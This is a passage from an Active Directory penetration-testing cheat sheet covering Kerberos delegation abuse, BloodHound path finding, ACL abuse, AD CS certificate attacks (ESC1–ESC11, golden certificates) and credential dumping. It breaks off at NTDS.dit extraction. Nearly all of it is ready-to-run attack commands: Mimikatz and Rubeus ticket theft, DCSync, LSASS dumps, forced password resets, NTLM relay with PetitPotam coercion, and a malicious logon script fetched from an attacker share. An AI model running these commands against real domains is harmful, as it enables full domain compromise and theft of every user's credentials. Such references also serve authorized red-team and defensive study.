ldapsearch -x -H ldap://<DC_IP> -D "<USERNAME>@<DOMAIN>" -w '<PASSWORD>' -b "dc=<DOMAIN>,dc=local" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" sAMAccountName
```

#### Unconstrained Delegation Attack

```powershell
# On compromised server with unconstrained delegation
# Step 1: Monitor for incoming TGTs
.\Rubeus.exe monitor /interval:5 /nowrap /targetuser:Administrator

# Step 2: Coerce authentication from a high-value target (e.g., DC)
# From another machine - PrinterBug
.\SpoolSample.exe <DC_FQDN> <COMPROMISED_SERVER_FQDN>

# Step 3: Extract and use the captured TGT
.\Rubeus.exe dump /nowrap
.\Rubeus.exe ptt /ticket:<BASE64_TGT>

# Or using Mimikatz
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt <TICKET>.kirbi

# Step 4: DCSync with the DC's TGT
mimikatz # lsadump::dcsync /user:<DOMAIN>\krbtgt
```

#### Constrained Delegation Attack - Windows

```powershell
# S4U attack - impersonate user to allowed service
# Using Rubeus (with password)
.\Rubeus.exe s4u /user:<SERVICE_ACCOUNT> /rc4:<NTLM_HASH> /impersonateuser:Administrator /msdsspn:<ALLOWED_SPN> /ptt

# Example: websvc can delegate to cifs/fileserver
.\Rubeus.exe s4u /user:websvc /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/fileserver.domain.local /ptt

# With AES key (stealthier)
.\Rubeus.exe s4u /user:<SERVICE_ACCOUNT> /aes256:<AES_KEY> /impersonateuser:Administrator /msdsspn:<ALLOWED_SPN> /ptt

# Alternative SPN (abuse service name flexibility)
.\Rubeus.exe s4u /user:websvc /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/fileserver.domain.local /altservice:ldap /ptt
```

#### Constrained Delegation Attack - Linux

```bash
# Impacket getST - get service ticket as impersonated user
impacket-getST -spn <ALLOWED_SPN> -impersonate Administrator <DOMAIN>/<SERVICE_ACCOUNT>:<PASSWORD> -dc-ip <DC_IP>

# With hash
impacket-getST -spn cifs/fileserver.domain.local -impersonate Administrator <DOMAIN>/<SERVICE_ACCOUNT> -hashes :<NTLM_HASH> -dc-ip <DC_IP>

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec <DOMAIN>/Administrator@fileserver.domain.local -k -no-pass
impacket-smbclient <DOMAIN>/Administrator@fileserver.domain.local -k -no-pass
```

#### Resource-Based Constrained Delegation (RBCD) Attack

```powershell
# Requirements: GenericAll/GenericWrite/WriteDacl on target computer object

# Step 1: Create a machine account (if MAQ > 0)
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount YOURCOMPUTER -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Get the new machine account SID
$ComputerSid = Get-DomainComputer YOURCOMPUTER -Properties objectsid | Select -Expand objectsid

# Step 2: Set RBCD on target (allow our machine to delegate to target)
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer <TARGET_COMPUTER> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Or using AD Module
Set-ADComputer <TARGET_COMPUTER> -PrincipalsAllowedToDelegateToAccount YOURCOMPUTER$

# Step 3: Calculate hash of machine account password
.\Rubeus.exe hash /password:Password123!

# Step 4: S4U attack
.\Rubeus.exe s4u /user:YOURCOMPUTER$ /rc4:<MACHINE_HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_COMPUTER> /ptt
```

#### RBCD Attack - Linux

```bash
# Step 1: Add machine account
impacket-addcomputer <DOMAIN>/<USERNAME>:<PASSWORD> -computer-name 'YOURCOMPUTER -computer-pass 'Password123!' -dc-ip <DC_IP>

# Step 2: Configure RBCD on target
impacket-rbcd <DOMAIN>/<USERNAME>:<PASSWORD> -delegate-from 'YOURCOMPUTER -delegate-to '<TARGET_COMPUTER> -action write -dc-ip <DC_IP>

# Step 3: Get service ticket
impacket-getST -spn cifs/<TARGET_COMPUTER>.<DOMAIN> -impersonate Administrator <DOMAIN>/'YOURCOMPUTER:'Password123!' -dc-ip <DC_IP>

# Step 4: Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec <DOMAIN>/Administrator@<TARGET_COMPUTER>.<DOMAIN> -k -no-pass
impacket-secretsdump <DOMAIN>/Administrator@<TARGET_COMPUTER>.<DOMAIN> -k -no-pass

# Cleanup - remove RBCD configuration
impacket-rbcd <DOMAIN>/<USERNAME>:<PASSWORD> -delegate-to '<TARGET_COMPUTER> -action flush -dc-ip <DC_IP>
```

---

## 5.13 üó∫Ô∏è BloodHound & Attack Path Analysis

### üéØ Goal

Visualize and identify privilege escalation paths through AD object relationships.

### üìã Prerequisites

- Domain user credentials
- BloodHound + Neo4j installed
- SharpHound or bloodhound-python collector

### üîß Commands

#### Install BloodHound (Kali)

```bash
# Install neo4j and bloodhound
sudo apt install neo4j bloodhound

# Start neo4j (default creds neo4j:neo4j, change on first login)
sudo neo4j start

# Access neo4j browser at http://localhost:7474 to set password

# Start BloodHound
bloodhound
```

#### Data Collection - Windows (SharpHound)

```powershell
# All collection methods (comprehensive)
.\SharpHound.exe -c All
.\SharpHound.exe -c All -d <DOMAIN> --zipfilename bloodhound.zip

# Specific collection methods
.\SharpHound.exe -c DCOnly                    # DC info only (fast, stealthy)
.\SharpHound.exe -c Session                   # Session info
.\SharpHound.exe -c LoggedOn                  # Logged on users
.\SharpHound.exe -c Group                     # Group memberships
.\SharpHound.exe -c LocalAdmin                # Local admin rights
.\SharpHound.exe -c Trusts                    # Domain trusts
.\SharpHound.exe -c ACL                       # ACL info
.\SharpHound.exe -c ObjectProps               # Object properties

# Multiple methods
.\SharpHound.exe -c Group,LocalAdmin,Session,ACL

# Stealth mode (slower, less noise)
.\SharpHound.exe -c All --stealth

# Loop collection (continuous session monitoring)
.\SharpHound.exe -c Session --loop --loopduration 02:00:00

# Exclude DCs from collection
.\SharpHound.exe -c All --excludedcs

# PowerShell version
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp
Invoke-BloodHound -CollectionMethod All -CompressData -RemoveCSV
```

#### Data Collection - Linux (bloodhound-python)

```bash
# All collection methods
bloodhound-python -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -dc <DC_IP> -c All
bloodhound-python -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -dc <DC_IP> -c All --zip

# With hash
bloodhound-python -u <USERNAME> --hashes :<NTLM_HASH> -d <DOMAIN> -dc <DC_IP> -c All

# Specific methods
bloodhound-python -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -dc <DC_IP> -c Group,LocalAdmin,Session

# Using Kerberos authentication
bloodhound-python -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -dc <DC_IP> -c All -k

# Specify nameserver
bloodhound-python -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -dc <DC_IP> -c All -ns <DNS_SERVER>
```

#### Import Data to BloodHound

```
1. Start BloodHound GUI
2. Login with neo4j credentials
3. Click "Upload Data" (up arrow icon)
4. Select the ZIP file(s) generated by SharpHound/bloodhound-python
5. Wait for import to complete
```

#### Key Pre-Built Queries

```
Analysis Tab > Pre-Built Analytics Queries:

Find all Domain Admins
Find Shortest Paths to Domain Admins
Find Principals with DCSync Rights
Find Computers where Domain Users are Local Admin
Find Computers with Unsupported Operating Systems
Find AS-REP Roastable Users (DontReqPreAuth)
Find Kerberoastable Users with most privileges
Shortest Paths to High Value Targets
Shortest Paths from Owned Principals
Find Computers with Unconstrained Delegation
Find Users with Constrained Delegation
Shortest Path from Kerberoastable Users
```

#### Custom Cypher Queries

```cypher
# Users with path to Domain Admins
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@<DOMAIN>"})) RETURN p

# Kerberoastable users with path to DA
MATCH (u:User {hasspn:true}) MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@<DOMAIN>"})) RETURN p

# AS-REP roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name,u.displayname

# Computers with unconstrained delegation (excluding DCs)
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name CONTAINS 'DC' RETURN c.name

# Users with constrained delegation
MATCH (u:User {trustedtoauth:true}) RETURN u.name,u.allowedtodelegate

# Find users with DCSync rights
MATCH (u)-[:DCSync|GetChangesAll*1..]->(d:Domain) RETURN u.name

# Find all sessions on a specific computer
MATCH (c:Computer {name:"<COMPUTER>@<DOMAIN>"})<-[:HasSession]-(u:User) RETURN u.name

# Find local admins on a computer
MATCH (c:Computer {name:"<COMPUTER>@<DOMAIN>"})<-[:AdminTo]-(u) RETURN u.name

# Shortest path from owned user to target
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(t:User {name:"<TARGET>@<DOMAIN>"})) RETURN p

# All users with GenericAll on Domain Admins
MATCH (u)-[:GenericAll]->(g:Group {name:"DOMAIN ADMINS@<DOMAIN>"}) RETURN u.name

# Find all GPOs that modify local group membership
MATCH (g:GPO)-[:GpLink]->(ou:OU)-[:Contains*1..]->(c:Computer) WHERE g.gpcpath CONTAINS "Groups.xml" RETURN g.name,c.name
```

#### Mark Objects as Owned/High Value

```
Right-click on node > Mark User/Computer as Owned
Right-click on node > Mark User/Computer as High Value

Then run: "Shortest Paths from Owned Principals"
```

#### BloodHound Attack Path Execution

```
1. Identify shortest path to Domain Admins
2. Note each edge (relationship) in the path
3. For each edge, determine the abuse technique:
   - MemberOf: Already member of group
   - AdminTo: Local admin, dump creds or lateral move
   - HasSession: Dump creds from that machine
   - GenericAll: Change password, add to group, or set SPN
   - GenericWrite: Modify attributes (SPN, delegation)
   - WriteDacl: Grant yourself more permissions
   - WriteOwner: Take ownership then WriteDacl
   - ForceChangePassword: Reset password
   - AddMember: Add yourself to group
   - DCSync: Dump all hashes
4. Execute each step in order
5. Mark compromised objects as "Owned" and re-run queries
```

---

## 5.14 üõ°Ô∏è ACL-Based Attacks

### üéØ Goal

Abuse misconfigured Access Control Lists (ACLs) for privilege escalation.

### üìã Prerequisites

- Identified ACL misconfigurations (via BloodHound or manual enumeration)
- Appropriate tooling (PowerView, bloodyAD, etc.)

### üîß Commands

#### Enumerate ACLs - Windows

```powershell
# PowerView - Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# ACLs on specific object
Get-ObjectAcl -SamAccountName <TARGET_USER> -ResolveGUIDs
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs

# Filter for specific rights
Get-ObjectAcl -Identity <TARGET> -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty|WriteDacl|WriteOwner|Self"
}

# Find who has rights over us
Get-ObjectAcl -SamAccountName <OUR_USER> -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -ne "ReadProperty"}

# ACLs on all users
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty|WriteDacl|WriteOwner" -and
    $_.SecurityIdentifier -match "<OUR_SID>"
}
```

#### Enumerate ACLs - Linux

```bash
# Using bloodyAD
bloodyAD -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC_IP> get writable --detail

# Using dacledit (Impacket)
impacket-dacledit <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -target '<TARGET_USER>' -action read

# Using ldapsearch for specific attributes
ldapsearch -x -H ldap://<DC_IP> -D "<USERNAME>@<DOMAIN>" -w '<PASSWORD>' -b "dc=<DOMAIN>,dc=local" "(sAMAccountName=<TARGET>)" nTSecurityDescriptor
```

---

### GenericAll on User

Full control over user object - can change password, set SPN, modify any attribute.

```powershell
# Option 1: Change password
net user <TARGET_USER> NewPassword123! /domain

# Using PowerView
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)

# Option 2: Targeted Kerberoasting (set SPN)
Set-DomainObject -Identity <TARGET_USER> -SET @{serviceprincipalname='nonexistent/YOURSPN'}
.\Rubeus.exe kerberoast /user:<TARGET_USER>
# Then clear SPN
Set-DomainObject -Identity <TARGET_USER> -Clear serviceprincipalname

# Option 3: Targeted AS-REP Roasting (disable preauth)
Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304}
.\Rubeus.exe asreproast /user:<TARGET_USER>
# Then re-enable preauth
Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304}

# Option 4: Shadow Credentials (if AD CS exists)
.\Whisker.exe add /target:<TARGET_USER>
# Use the output Rubeus command
```

```bash
# Linux - bloodyAD
# Change password
bloodyAD -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC_IP> set password <TARGET_USER> 'NewPassword123!'

# Set SPN for Kerberoasting
bloodyAD -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC_IP> set object <TARGET_USER> servicePrincipalName -v 'fake/spn'

# Shadow Credentials
certipy shadow auto -u <USERNAME>@<DOMAIN> -p <PASSWORD> -account <TARGET_USER>
```

---

### GenericAll on Group

Full control over group object - can add/remove members.

```powershell
# Add yourself to the group
net group "<TARGET_GROUP>" <YOUR_USER> /add /domain

# Using PowerView
Add-DomainGroupMember -Identity "<TARGET_GROUP>" -Members <YOUR_USER>

# Using AD Module
Add-ADGroupMember -Identity "<TARGET_GROUP>" -Members <YOUR_USER>

# Verify
Get-DomainGroupMember -Identity "<TARGET_GROUP>"
```

```bash
# Linux - bloodyAD
bloodyAD -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC_IP> add groupMember "<TARGET_GROUP>" <YOUR_USER>

# Using net rpc
net rpc group addmem "<TARGET_GROUP>" <YOUR_USER> -U <DOMAIN>/<USERNAME>%<PASSWORD> -S <DC_IP>
```

---

### GenericAll on Computer

Full control over computer object - can configure RBCD, read LAPS password.

```powershell
# Option 1: RBCD Attack (see section 5.12)
Set-ADComputer <TARGET_COMPUTER> -PrincipalsAllowedToDelegateToAccount <YOUR_MACHINE>$

# Option 2: Read LAPS password (if LAPS installed)
Get-DomainComputer <TARGET_COMPUTER> -Properties ms-mcs-admpwd | select ms-mcs-admpwd

# Using AD Module
Get-ADComputer <TARGET_COMPUTER> -Properties ms-mcs-admpwd | select ms-mcs-admpwd

# Option 3: Shadow Credentials
.\Whisker.exe add /target:<TARGET_COMPUTER>$
```

```bash
# Linux - RBCD
impacket-rbcd <DOMAIN>/<USERNAME>:<PASSWORD> -delegate-from '<YOUR_MACHINE> -delegate-to '<TARGET_COMPUTER> -action write -dc-ip <DC_IP>

# Read LAPS password
netexec ldap <DC_IP> -u <USERNAME> -p <PASSWORD> -M laps
bloodyAD -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC_IP> get object <TARGET_COMPUTER>$ --attr ms-mcs-admpwd
```

---

### GenericWrite

Can write to specific attributes - useful for setting SPN, delegation, or logon scripts.

```powershell
# Set SPN for Kerberoasting
Set-DomainObject -Identity <TARGET_USER> -SET @{serviceprincipalname='fake/spn'}

# Set script path (malicious logon script)
Set-DomainObject -Identity <TARGET_USER> -SET @{scriptpath='\\<ATTACKER_IP>\share\evil.ps1'}

# Modify msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD
```

```bash
# Linux - bloodyAD
bloodyAD -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC_IP> set object <TARGET> servicePrincipalName -v 'fake/spn'
```

---

### WriteDacl

Can modify the ACL of the object - grant yourself more permissions.

```powershell
# Grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <YOUR_USER> -Rights All

# Grant DCSync rights on domain
Add-DomainObjectAcl -TargetIdentity "DC=<DOMAIN>,DC=local" -PrincipalIdentity <YOUR_USER> -Rights DCSync
```

```bash
# Linux - bloodyAD
bloodyAD -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC_IP> add genericAll 'OU=<TARGET_OU>,DC=<DOMAIN>,DC=local' <YOUR_USER>

# Add DCSync rights
bloodyAD -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC_IP> add dcsync <YOUR_USER>

# Using dacledit
impacket-dacledit <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -target '<TARGET>' -action write -rights FullControl -principal <YOUR_USER>
```

---

### WriteOwner

Can take ownership of the object - then modify ACL (WriteDacl).

```powershell
# Take ownership
Set-DomainObjectOwner -Identity <TARGET> -OwnerIdentity <YOUR_USER>

# Then grant yourself rights
Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <YOUR_USER> -Rights All
```

```bash
# Linux - bloodyAD
bloodyAD -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC_IP> set owner <TARGET> <YOUR_USER>

# Then add rights
bloodyAD -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC_IP> add genericAll <TARGET> <YOUR_USER>
```

---

### ForceChangePassword

Can reset password without knowing current password.

```powershell
# PowerView
$NewPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $NewPassword

# Using net
net user <TARGET_USER> NewPassword123! /domain

# Using rpcclient
rpcclient -U '<DOMAIN>/<YOUR_USER>%<YOUR_PASSWORD>' <DC_IP> -c "setuserinfo2 <TARGET_USER> 23 'NewPassword123!'"
```

```bash
# Linux - bloodyAD
bloodyAD -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC_IP> set password <TARGET_USER> 'NewPassword123!'

# Using rpcclient
rpcclient -U '<YOUR_USER>%<YOUR_PASSWORD>' <DC_IP> -c "setuserinfo2 <TARGET_USER> 23 'NewPassword123!'"
```

---

### AddMember (Self/WriteProperty on member attribute)

Can add members to a group.

```powershell
# Add yourself to group
Add-DomainGroupMember -Identity "<TARGET_GROUP>" -Members <YOUR_USER>

net group "<TARGET_GROUP>" <YOUR_USER> /add /domain
```

```bash
# Linux
bloodyAD -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC_IP> add groupMember "<TARGET_GROUP>" <YOUR_USER>
```

---

### DCSync Rights (DS-Replication-Get-Changes-All)

Can replicate domain credentials from DC.

```powershell
# Mimikatz
mimikatz # lsadump::dcsync /user:<DOMAIN>\Administrator
mimikatz # lsadump::dcsync /user:<DOMAIN>\krbtgt
```

```bash
# Impacket
impacket-secretsdump <DOMAIN>/<YOUR_USER>:<YOUR_PASSWORD>@<DC_IP> -just-dc
```

---

## 5.15 üìú AD CS Abuse

### üéØ Goal

Exploit Active Directory Certificate Services misconfigurations for privilege escalation and persistence.

### üìã Prerequisites

- Domain user credentials
- AD CS deployed in environment
- Certipy or Certify for enumeration and exploitation

### üîß Commands

#### Enumerate AD CS - Linux

```bash
# Certipy - find all templates and CAs
certipy find -u <USERNAME>@<DOMAIN> -p <PASSWORD> -dc-ip <DC_IP>

# Find vulnerable templates only
certipy find -u <USERNAME>@<DOMAIN> -p <PASSWORD> -dc-ip <DC_IP> -vulnerable -stdout

# Output files: YYYYMMDDHHMMSS_Certipy.txt, .json, .zip
# Review the text file for "ESC" vulnerabilities
```

#### Enumerate AD CS - Windows

```powershell
# Certify - find all
.\Certify.exe find

# Find vulnerable templates
.\Certify.exe find /vulnerable

# List CAs
.\Certify.exe cas

# Find templates with specific EKU
.\Certify.exe find /enrolleeSuppliesSubject
```

---

### ESC1 - Misconfigured Certificate Templates

**Conditions:**

- Template allows Client Authentication EKU
- ENROLLEE_SUPPLIES_SUBJECT flag enabled (can specify SAN)
- Low-privileged users can enroll

```bash
# Request certificate as another user (e.g., Administrator)
certipy req -u <USERNAME>@<DOMAIN> -p <PASSWORD> -ca <CA_NAME> -target <CA_SERVER> -template <VULNERABLE_TEMPLATE> -upn Administrator@<DOMAIN>

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>

# Output: Administrator's NTLM hash
# Use the hash for Pass-the-Hash
```

```powershell
# Certify - request certificate with alternate name
.\Certify.exe request /ca:<CA_SERVER>\<CA_NAME> /template:<VULNERABLE_TEMPLATE> /altname:Administrator

# Convert to PFX (need openssl)
# Copy the certificate to a .pem file, then:
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Rubeus - request TGT using certificate
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt
```

---

### ESC2 - Any Purpose EKU or No EKU

**Conditions:**

- Template has "Any Purpose" EKU or no EKU
- Low-privileged users can enroll

```bash
# Same exploitation as ESC1
certipy req -u <USERNAME>@<DOMAIN> -p <PASSWORD> -ca <CA_NAME> -target <CA_SERVER> -template <VULNERABLE_TEMPLATE> -upn Administrator@<DOMAIN>
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

### ESC3 - Enrollment Agent Templates

**Conditions:**

- Template 1: Allows enrollment agent certificate request
- Template 2: Allows enrollment on behalf of another user

```bash
# Step 1: Request enrollment agent certificate
certipy req -u <USERNAME>@<DOMAIN> -p <PASSWORD> -ca <CA_NAME> -target <CA_SERVER> -template <ENROLLMENT_AGENT_TEMPLATE>

# Step 2: Use enrollment agent cert to request cert on behalf of another user
certipy req -u <USERNAME>@<DOMAIN> -p <PASSWORD> -ca <CA_NAME> -target <CA_SERVER> -template <TEMPLATE2> -on-behalf-of '<DOMAIN>\Administrator' -pfx <ENROLLMENT_AGENT>.pfx

# Step 3: Authenticate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

### ESC4 - Vulnerable Certificate Template ACL

**Conditions:**

- Low-privileged user has write access to template object
- Can modify template to enable ESC1 conditions

```bash
# Save original template configuration
certipy template -u <USERNAME>@<DOMAIN> -p <PASSWORD> -template <TEMPLATE_NAME> -save-old

# Modify template to enable ESC1 (adds ENROLLEE_SUPPLIES_SUBJECT)
certipy template -u <USERNAME>@<DOMAIN> -p <PASSWORD> -template <TEMPLATE_NAME> -configuration ESC1

# Exploit as ESC1
certipy req -u <USERNAME>@<DOMAIN> -p <PASSWORD> -ca <CA_NAME> -target <CA_SERVER> -template <TEMPLATE_NAME> -upn Administrator@<DOMAIN>
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>

# Restore original template
certipy template -u <USERNAME>@<DOMAIN> -p <PASSWORD> -template <TEMPLATE_NAME> -configuration <TEMPLATE_NAME>.json
```

---

### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

**Conditions:**

- CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled
- Allows specifying SAN in any certificate request

```bash
# Request certificate with SAN for any template
certipy req -u <USERNAME>@<DOMAIN> -p <PASSWORD> -ca <CA_NAME> -target <CA_SERVER> -template User -upn Administrator@<DOMAIN>
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

### ESC7 - Vulnerable CA ACL

**Conditions:**

- User has ManageCA or ManageCertificates rights on CA

```bash
# If ManageCA: Add yourself as officer, then approve pending requests
certipy ca -u <USERNAME>@<DOMAIN> -p <PASSWORD> -ca <CA_NAME> -add-officer <USERNAME>

# Enable SubjectAltRequireUpn flag
certipy ca -u <USERNAME>@<DOMAIN> -p <PASSWORD> -ca <CA_NAME> -enable-template SubCA

# Request certificate (will be pending)
certipy req -u <USERNAME>@<DOMAIN> -p <PASSWORD> -ca <CA_NAME> -target <CA_SERVER> -template SubCA -upn Administrator@<DOMAIN>

# Issue the pending request
certipy ca -u <USERNAME>@<DOMAIN> -p <PASSWORD> -ca <CA_NAME> -issue-request <REQUEST_ID>

# Retrieve the certificate
certipy req -u <USERNAME>@<DOMAIN> -p <PASSWORD> -ca <CA_NAME> -target <CA_SERVER> -retrieve <REQUEST_ID>
```

---

### ESC8 - NTLM Relay to AD CS HTTP Endpoint

**Conditions:**

- CA has HTTP enrollment endpoint enabled
- NTLM authentication enabled on endpoint

```bash
# Step 1: Start relay targeting CA web enrollment
impacket-ntlmrelayx -t http://<CA_SERVER>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Step 2: Coerce authentication from DC
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>

# Step 3: Use the certificate
certipy auth -pfx <DC>$.pfx -dc-ip <DC_IP>

# Will get DC machine account hash - use for DCSync
impacket-secretsdump <DOMAIN>/'<DC>@<DC_IP> -hashes :<NTLM_HASH>
```

---

### ESC9 & ESC10 - No Security Extension / Weak Certificate Mapping

```bash
# ESC9: CT_FLAG_NO_SECURITY_EXTENSION flag set
# Allows changing UPN after enrollment

# Change target user's UPN to match ours
certipy shadow auto -u <USERNAME>@<DOMAIN> -p <PASSWORD> -account <TARGET_USER>
```

---

### ESC11 - NTLM Relay to ICPR (RPC)

```bash
# Relay to RPC endpoint instead of HTTP
impacket-ntlmrelayx -t "rpc://<CA_SERVER>" -rpc-mode ICPR -icpr-ca-name <CA_NAME> -smb2support

# Coerce and obtain certificate
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>
```

---

### Shadow Credentials Attack

**Conditions:**

- Write access to msDS-KeyCredentialLink attribute on target
- AD CS or Azure AD configured for certificate authentication

```bash
# Linux - Certipy
certipy shadow auto -u <USERNAME>@<DOMAIN> -p <PASSWORD> -account <TARGET_USER>
# Outputs: certificate and NT hash

# Using pywhisker
python3 pywhisker.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --target <TARGET_USER> --action add --dc-ip <DC_IP>
# Use output with PKINITtools to get TGT
```

```powershell
# Windows - Whisker
.\Whisker.exe add /target:<TARGET_USER>
# Follow the Rubeus command in output

# List shadow credentials
.\Whisker.exe list /target:<TARGET_USER>

# Remove shadow credentials
.\Whisker.exe remove /target:<TARGET_USER> /deviceid:<DEVICE_ID>
```

---

### Certificate Persistence - Golden Certificate

```bash
# Extract CA private key (requires CA admin)
certipy ca -u Administrator@<DOMAIN> -p <PASSWORD> -ca <CA_NAME> -backup

# Forge certificate for any user
certipy forge -ca-pfx <CA>.pfx -upn Administrator@<DOMAIN> -subject 'CN=Administrator,CN=Users,DC=<DOMAIN>,DC=local'

# Authenticate
certipy auth -pfx forged.pfx -dc-ip <DC_IP>
```

---

## 5.16 üîê Credential Extraction

### üéØ Goal

Extract credentials from memory, registry, and files on compromised systems.

### üìã Prerequisites

- Local administrator access on target
- Appropriate tools deployed

### üîß Commands

#### Mimikatz - Local Credential Extraction

```powershell
# Run Mimikatz (requires admin)
mimikatz.exe

# Enable debug privilege
mimikatz # privilege::debug
mimikatz # token::elevate

# Dump credentials from LSASS memory
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
mimikatz # sekurlsa::kerberos
mimikatz # sekurlsa::msv
mimikatz # sekurlsa::credman

# Dump SAM database (local accounts)
mimikatz # lsadump::sam

# Dump LSA secrets (service account passwords, cached credentials)
mimikatz # lsadump::secrets

# Dump cached domain credentials
mimikatz # lsadump::cache

# Dump DPAPI secrets
mimikatz # sekurlsa::dpapi
mimikatz # dpapi::cache

# Export all Kerberos tickets
mimikatz # sekurlsa::tickets /export

# One-liner
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

#### LSASS Dump Methods

```powershell
# Task Manager (GUI)
# Right-click lsass.exe > Create dump file

# Procdump (Sysinternals)
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# comsvcs.dll (native Windows)
# Get LSASS PID
tasklist /fi "imagename eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full

# PowerShell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full

# Using Out-Minidump
Import-Module .\Out-Minidump.ps1
Get-Process lsass | Out-Minidump -DumpFilePath C:\temp

# Analyze dump with Mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

```bash
# Linux - Analyze dump with pypykatz
pypykatz lsa minidump lsass.dmp
pypykatz lsa minidump lsass.dmp -o output.txt
```

#### Remote Credential Dumping

```bash
# Impacket secretsdump - comprehensive dump
impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
impacket-secretsdump <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH>

# SAM only (local accounts)
impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -sam

# LSA secrets only
impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -lsa

# From NTDS.dit (DC)
impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP> -just-dc
impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP> -just-dc-ntlm

# NetExec/CrackMapExec
netexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --sam
netexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --lsa
netexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --ntds

# Using modules
netexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -M lsassy
netexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -M nanodump
netexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -M mimikatz
```

#### Registry Credential Extraction

```powershell
# Save registry hives (requires admin)
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save

# Extract offline
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

#### NTDS.dit Extraction

```powershell
# VSS Shadow Copy method
